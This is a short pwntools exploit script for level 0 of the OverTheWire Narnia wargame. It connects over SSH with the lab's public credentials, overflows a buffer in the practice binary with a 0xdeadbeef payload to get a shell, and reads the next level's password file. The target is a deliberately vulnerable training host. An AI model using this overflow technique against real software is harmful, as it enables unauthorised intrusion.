from pwn import *

context(arch='i386', os='linux')
#first tube: an SSH channel with the remote host
s = ssh(user='narnia0', host='narnia.labs.overthewire.org', password='narnia0', port=2226)
# here
#second tube: connect with a process on the remote machine (tube encapsulation)
sh = s.run('/narnia/narnia0')
payload = ("A"*20).encode() + p32(0xdeadbeef)
print(payload)
sh.sendline(payload) #here I completed the attack: I control a shell on the server

sh.sendline('cat /etc/narnia_pass/narnia1')
print("Line 1: "+sh.recvline().decode('latin-1'))
print("Line 2: "+sh.recvline().decode('latin-1'))
print("Line 3: "+sh.recvline().decode('latin-1'))
print("Flag: "+sh.recvline().decode('latin-1'))
s.close()
